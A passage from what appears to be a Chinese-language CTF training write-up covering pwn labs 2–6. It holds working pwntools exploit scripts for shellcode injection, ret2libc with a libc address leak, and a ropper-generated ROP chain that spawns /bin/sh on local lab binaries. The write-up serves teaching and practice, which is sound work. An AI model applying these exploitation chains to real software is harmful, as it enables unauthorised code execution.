+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab2# python3 exp.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;orw.bin&#39;: pid 113</span><br><span class="line">b&#39;Give my your shellcode:&#39;</span><br><span class="line">[+] Receiving all data: Done (256B)</span><br><span class="line">[*] Stopped process &#39;.&#x2F;orw.bin&#39; (pid 113)</span><br><span class="line">b&#39;this is your flag\n\xf0\xf7\xb0\xf9\x9c\xff\x00\x00\x00\x00\x81\x8e\xd2\xf7\x00\x80\xee\xf7\x00\x80\xee\xf7\x00\x00\x00\x00\x81\x8e\xd2\xf7\x01\x00\x00\x00D\xfa\x9c\xffL\xfa\x9c\xff\xd4\xf9\x9c\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\xee\xf7Z\xb7\xf0\xf7\x000\xf2\xf7\x00\x00\x00\x00\x00\x80\xee\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x04\x1f1\x80\x14\xf9\xde\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xd0\x83\x04\x08\x00\x00\x00\x00 \x0e\xf1\xf7\xb0\xb9\xf0\xf7\x000\xf2\xf7\x01\x00\x00\x00\xd0\x83\x04\x08\x00\x00\x00\x00\xf1\x83\x04\x08H\x85\x04\x08\x01\x00\x00\x00D\xfa\x9c\xff\xa0\x85\x04\x08\x00\x86\x04\x08\xb0\xb9\xf0\xf7&lt;\xfa\x9c\xff@9\xf2\xf7\x01\x00\x00\x00\xb9\x18\x9d\xff\x00\x00\x00\x00\xc3\x18\x9d\xff\xd6\x18\x9d\xff\xc2\x1e\x9d\xff\xe4\x1e\x9d\xff\xf5\x1e\x9d\xff\x07\x1f\x9d\xff\x1a\x1f\x9d\xff%\x1f\x9d\xff&gt;\x1f\x9d\xffI\x1f\x9d\xffQ\x1f\x9d\xffc\x1f\x9d\xff\xa5\x1f\x9d\xff&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这里因为不知道flag长度，所以输出了一些超过的内存部分。</p>
+<p>关于seccomp的情况写在<a target="_blank" rel="noopener" href="https://www.sec4.fun/2018/07/23/seccomp">Seccomp 限制系统调用</a></p>
+<h3 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h3><p>题目基本信息、保护措施与运行情况如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab3# file ret2sc</span><br><span class="line">ret2sc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;31484b774646e78186848556eae669af027787ce, not stripped</span><br><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab3# checksec ret2sc</span><br><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;lab3&#x2F;ret2sc&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab3# .&#x2F;ret2sc</span><br><span class="line">Name:asasa</span><br><span class="line">Try your best:asasasass</span><br></pre></td></tr></table></figure>
+
+<p>使用ida查看main函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-14h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  printf(&quot;Name:&quot;);</span><br><span class="line">  read(0, &amp;name, 0x32u);</span><br><span class="line">  printf(&quot;Try your best:&quot;);</span><br><span class="line">  return (int)gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到首先将读取的0x32字节的输入放入.bss段的name，之后调用gets读取字符放入栈上变量s，这里由于gets函数会无限读取至遇到换行符，所以会导致栈溢出。而通过readelf可以看到.bss段是可以执行的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab3# objdump -h .&#x2F;ret2sc</span><br><span class="line"></span><br><span class="line">.&#x2F;ret2sc:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">...</span><br><span class="line"> 24 .bss          00000054  0804a040  0804a040  0000102c  2**5</span><br><span class="line">                  ALLOC</span><br></pre></td></tr></table></figure>
+
+<p>拿这题思路就比较直接，将shellcode注入name位置，然后利用栈溢出跳转至shellcode执行即可。</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2sc&quot;</span>)</span><br><span class="line">name_addr = <span class="number">0x804a060</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&quot;a&quot;</span>*<span class="number">32</span>,name_addr])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h3><p>查看程序基础信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab4# file ret2lib</span><br><span class="line">ret2lib: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;c74b2683d6d3b99439c3e04d6d81b233e6a3b1b6, not stripped</span><br><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab4# checksec ret2lib</span><br><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;lab4&#x2F;ret2lib&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">root@e76fd4f7:&#x2F;ctf&#x2F;work&#x2F;lab4# .&#x2F;ret2lib</span><br><span class="line">###############################</span><br><span class="line">Do you know return to library ?</span><br><span class="line">###############################</span><br><span class="line">What do you want to see in memory?</span><br><span class="line">Give me an address (in dec) :12345678</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>ida查看程序基本逻辑</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v3; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [esp+12h] [ebp-10Eh]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+112h] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  v8 = strtol(&amp;buf, v3, v4);</span><br><span class="line">  See_something(v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;src, <span class="number">0x100</span>u);</span><br><span class="line">  Print_message(&amp;src);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先接收一个字符串转换成十进制数并作为参数调用See_something查看该地址的数据。这个部分可用来泄露libc地址。</p>
+<p>接着Print_message函数中出现了一个溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">Print_message</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your message is : %s&quot;</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用这个漏洞可以进行ROP。</p>
+<p>总结一下思路：</p>
+<ul>
+<li>利用See_something去泄露printf地址，比对得到libc版本，计算libc基址与system地址</li>
+<li>利用栈溢出rop。</li>
+</ul>
+<p><strong>writeup</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2lib&quot;)</span><br><span class="line">got_puts &#x3D; 0x804A01C</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Give me an address (in dec) :&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(got_puts))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">puts_addr &#x3D; int(p.recvuntil(&quot;\n&quot;).strip(),16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj &#x3D; LibcSearcher(&quot;puts&quot;, puts_addr)#这里libc版本搜素似乎有些错误-&gt;但原题目好像是已知libc版本</span><br><span class="line">libc_base &#x3D; puts_addr - obj.dump(&quot;puts&quot;)</span><br><span class="line">#print(hex(obj.dump(&quot;system&quot;)))</span><br><span class="line">system_addr &#x3D; obj.dump(&quot;system&quot;) + libc_base</span><br><span class="line">str_sh &#x3D; obj.dump(&quot;str_bin_sh&quot;) + libc_base</span><br><span class="line">p.recvuntil(&quot;Leave some message for me :&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#print(hex(system_addr))</span><br><span class="line">#pd &#x3D; cyclic(x100)</span><br><span class="line">#input()</span><br><span class="line">payload &#x3D; flat([&quot;a&quot;*60,system_addr,&quot;bbbb&quot;,str_sh])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h3><p>经典的ROP题目，基本信息如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@dc29cfb4:/ctf/work/lab5# file simplerop</span><br><span class="line">simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped</span><br><span class="line">root@dc29cfb4:/ctf/work/lab5# checksec simplerop</span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">    To disable this functionality, set the contents of /root/.pwntools-cache-3.6/update to &#x27;never&#x27;.</span><br><span class="line">[*] A newer version of pwntools is available on pypi (4.0.1 --&gt; 4.2.1).</span><br><span class="line">    Update with: $ pip install -U pwntools</span><br><span class="line">[*] &#x27;/ctf/work/lab5/simplerop&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">root@dc29cfb4:/ctf/work/lab5# ./simplerop</span><br><span class="line">ROP is easy is&#x27;nt it ?</span><br><span class="line">Your input :aaaaaaaaaa</span><br></pre></td></tr></table></figure>
+
+<p>有一些比较关键的信息，栈保护没开，并且是静态链接，这是比较简单的ROP的基本操作。利用ida查看反编译代码逻辑</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑非常的简单，栈上0x14字节空间读入了100字节数据溢出，ROP可以秒杀但需要注意payload要控制在100字节内。这里我使用ropper直接生成chain：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">root@dc29cfb4:&#x2F;ctf&#x2F;work&#x2F;lab5# ropper -f .&#x2F;simplerop --chain &quot;execve cmd&#x3D;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">[INFO] Load gadgets for section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line"></span><br><span class="line">[INFO] ROPchain Generator for syscall execve:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO]</span><br><span class="line">write command into data section</span><br><span class="line">eax 0xb</span><br><span class="line">ebx address to cmd</span><br><span class="line">ecx address to null</span><br><span class="line">edx address to null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] Try to create chain which fills registers without delete content of previous filled registers</span><br><span class="line">[*] Try permuation 1 &#x2F; 24</span><br><span class="line">[INFO] Look for syscall gadget</span><br><span class="line"></span><br><span class="line">[INFO] syscall gadget found</span><br><span class="line">[INFO] generating rop chain</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># Generated by ropper ropchain generator #</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">p &#x3D; lambda x : pack(&#39;I&#39;, x)</span><br><span class="line"></span><br><span class="line">IMAGE_BASE_0 &#x3D; 0x08048000 # 69bf22d0c745d6fe77b538df2c44a18efb54a904539c9f8604927d0f701ba020</span><br><span class="line">rebase_0 &#x3D; lambda x : p(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">rop &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">rop +&#x3D; rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;</span><br><span class="line">rop +&#x3D; &#39;&#x2F;&#x2F;&#x2F;&#x2F;&#39;</span><br><span class="line">rop +&#x3D; rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000a2060)</span><br><span class="line">rop +&#x3D; rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;</span><br><span class="line">rop +&#x3D; &#39;bin&#x2F;&#39;</span><br><span class="line">rop +&#x3D; rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000a2064)</span><br><span class="line">rop +&#x3D; rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;</span><br><span class="line">rop +&#x3D; &#39;bash&#39;</span><br><span class="line">rop +&#x3D; rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000a2068)</span><br><span class="line">rop +&#x3D; rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;</span><br><span class="line">rop +&#x3D; p(0x00000000)</span><br><span class="line">rop +&#x3D; rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000a206c)</span><br><span class="line">rop +&#x3D; rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000a2060)</span><br><span class="line">rop +&#x3D; rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000a206c)</span><br><span class="line">rop +&#x3D; rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;</span><br><span class="line">rop +&#x3D; rebase_0(0x000a206c)</span><br><span class="line">rop +&#x3D; rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;</span><br><span class="line">rop +&#x3D; p(0x0000000b)</span><br><span class="line">rop +&#x3D; rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret;</span><br><span class="line">print rop</span><br><span class="line">[INFO] rop chain generated!</span><br></pre></td></tr></table></figure>
+
+<p>生成的chain比较丑陋而且太长了，缩减其中的部分后可以得到后面writeup中payload。</p>
+<p>之后测定返回地址前数据长度，使用cyclic生成100B数据并结合gdb调试进行测试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./simplerop&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your input :&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">100</span>)</span><br><span class="line">input() <span class="comment">#for debug</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>利用input断下脚本。gdb attach到相应pid设下断点后继续运行脚本，发现ret时的指令地址是<code>0x61616169</code>，通过<code>cyclic_find</code>找出偏移字节32，最后形成writeup。</p>
+<p><strong>writeup</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./simplerop&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your input :&quot;</span>)</span><br><span class="line"><span class="comment">#payload = cyclic(100)</span></span><br><span class="line"><span class="comment">#input() #for debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add base address</span></span><br><span class="line">basep = <span class="keyword">lambda</span> x : (x + <span class="number">0x08048000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这段payload利用ropper生成并进行了长度缩减</span></span><br><span class="line"><span class="comment">#root@4a32d8eb:/ctf/work/lab5# ropper --file ./simplerop --chain &quot;execve cmd=/bin/sh&quot;</span></span><br><span class="line"><span class="comment">#0x0806e850 -&gt; pop edx; pop ecx; pop ebx; ret</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>,basep(<span class="number">0x00072e06</span>),<span class="string">&#x27;/bin&#x27;</span>,basep(<span class="number">0x0002682a</span>),           basep(<span class="number">0x000a2060</span>),basep(<span class="number">0x0005215d</span>),basep(<span class="number">0x00072e06</span>),<span class="string">&#x27;/sh\x00&#x27;</span>,             basep(<span class="number">0x0002682a</span>),basep(<span class="number">0x000a2064</span>),basep(<span class="number">0x0005215d</span>),<span class="number">0x0806e850</span>,<span class="number">0</span>,<span class="number">0</span>,       basep(<span class="number">0x000a2060</span>),basep(<span class="number">0x00072e06</span>),<span class="number">0xb</span>,basep(<span class="number">0x00026ef0</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#input() #for debug</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h3><p>查看题目基本信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@5aa3762b:/ctf/work/lab6<span class="comment"># file migration</span></span><br><span class="line">migration: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e65737a9201bfe28db6fe46f06d9428f5c814951, not stripped</span><br><span class="line">root@5aa3762b:/ctf/work/lab6<span class="comment"># checksec migration</span></span><br><span class="line">[*] Checking <span class="keyword">for</span> new versions of pwntools</span><br><span class="line">    To <span class="built_in">disable</span> this functionality, <span class="built_in">set</span> the contents of /root/.pwntools-cache-3.6/update to <span class="string">&#x27;never&#x27;</span>.</span><br><span class="line">[*] A newer version of pwntools is available on pypi (4.0.1 --&gt; 4.2.1).</span><br><span class="line">    Update with: $ pip install -U pwntools</span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/lab6/migration&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">root@5aa3762b:/ctf/work/lab6<span class="comment"># ./migration</span></span><br><span class="line">Try your best :</span><br><span class="line">asaaaaaaaaaaa</span><br><span class="line">root@5aa3762b:/ctf/work/lab6<span class="comment"># ./migration</span></span><br><span class="line">Try your best :</span><br><span 